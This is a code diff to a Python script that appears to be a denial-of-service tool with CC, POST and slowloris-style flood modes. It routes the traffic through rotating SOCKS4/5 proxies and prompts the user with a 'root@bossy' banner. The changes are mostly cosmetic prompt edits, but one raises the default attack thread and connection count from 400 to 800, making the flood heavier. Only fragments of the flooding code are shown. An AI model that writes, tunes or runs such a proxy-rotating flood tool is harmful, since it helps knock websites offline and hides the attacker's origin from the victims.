@@ -188,7 +188,7 @@ def slow(conn,socks_type):
 		if socks_type == 5:
 			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
 	except:
-		print("[!] Something wrong in socks list")
+		print("[!] Something Wrong In Socks List")
 		slow(conn,socks_type)#restart
 	for _ in range(conn):
 		try:
@@ -307,8 +307,8 @@ def check_socks(ms):#root@bossy:~#
 		th.join()
 		sys.stdout.write("root@bossy:~# Checked "+str(nums)+" Proxies\r")
 		sys.stdout.flush()
-	print("\r\n> root@bossy:~# Checked All Proxies Total Worked :"+str(len(proxies)))
-	ans = input("root@bossy:~# Do U Want To Save Them In A File ? ( Y/n, Default = Y )")
+	print("\r\n> root@bossy:~# Checked All Proxies Total Worked : "+str(len(proxies)))
+	ans = input("root@bossy:~# Do U Want To Save Them In A File ? ( Y / n Default = Y ) ")
 	if ans == "Y" or ans == "":
 		if choice == "4":
 			with open("Socks4.txt", 'wb') as fp:
@@ -400,12 +400,12 @@ def main():
 	ip = ""
 	port = ""
 	mode = ""
-	print("root@bossy:~# Mode : [ cc / post / slow / check ]")
+	print("root@bossy:~# Mode : [ CC / POST / SLOW / CHECK ]")
 	while mode == "" :
-		mode = str(input("root@bossy:~# Choose Your Mode ( default = cc ) : ")).strip()
+		mode = str(input("root@bossy:~# Choose Your Mode ( Default = CC ) : ")).strip()
 		if mode == "":
-			mode = "cc"
-		elif(mode != "cc") and (mode != "post")and(mode != "slow" )and(mode !="check"):
+			mode = "CC"
+		elif(mode != "CC") and (mode != "POST")and(mode != "SLOW" )and(mode !="CHECK"):
 			print("root@bossy:~# Plese Enter Correct Mode")
 			mode = ""
 			continue
@@ -430,11 +430,11 @@ def main():
 		if str(port) == '443':
 			print("root@bossy:~# [!] Enable SSL Mode")
 	if mode == "post":
-		mode2 = str(input("root@bossy:~# Customize Post Data? ( y /  n Default = n ) : ")).strip()
+		mode2 = str(input("root@bossy:~# Customize Post Data ? ( y /  n Default = n ) : ")).strip()
 		if mode2 == "y":
 			data = open(input("root@bossy:~# Input The File's Path : ").strip()).readlines()
 			data = ' '.join([str(txt) for txt in data])
-	choice2 = str(input("root@bossy:~# Customize Cookies? ( y / n Default = n ) : ")).strip()
+	choice2 = str(input("root@bossy:~# Customize Cookies ? ( y / n Default = n ) : ")).strip()
 	if choice2 == "y":
 		cookies = str(input("root@bossy:~# Plese Input The Cookies : ")).strip()
 	choice = ""
@@ -489,11 +489,11 @@ def main():
 		print("root@bossy:~# End Of Process")
 		return
 	if mode == "slow":	
-		thread_num = str(input("root@bossy:~# Connections ( Default = 400 ) : "))
+		thread_num = str(input("root@bossy:~# Connections ( Default = 800 ) : "))
 	else:
-		thread_num = str(input("root@bossy:~# Threads ( Default = 400 ) : "))
+		thread_num = str(input("root@bossy:~# Threads ( Default = 800 ) : "))
 	if thread_num == "":
-		thread_num = int(400)
+		thread_num = int(800)
 	else:
 		try:
 			thread_num = int(thread_num)
@@ -546,7 +546,7 @@ def main():
 			multiple = int(100)
 		else:
 			multiple = int(multiple)
-		input("root@bossy:~# Press Enter to Continue.")
+		input("root@bossy:~# Press Enter to Continue")
 		if mode == "post":
 			for _ in range(thread_num):
 				th = threading.Thread(target = post,args=(socks_type,))
